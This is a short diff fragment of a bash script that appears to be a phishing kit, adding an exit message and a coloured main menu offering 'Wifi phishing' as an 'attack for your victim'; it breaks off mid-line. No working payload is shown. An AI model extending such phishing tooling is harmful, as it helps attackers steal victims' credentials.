@@ -280,3 +280,24 @@ tunnel_menu() {
 	esac
 }
 
+## Exit message
+msg_exit() {
+	{ clear; banner; echo; }
+	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	{ reset_color; exit 0; }
+}
+
+## Menu
+main_menu() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}01${RED}]${ORANGE} Wifi phishing
+		${RED}[${WHITE}00${RED}]${ORANGE} Exit
+         EOF
+	
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+                       website="
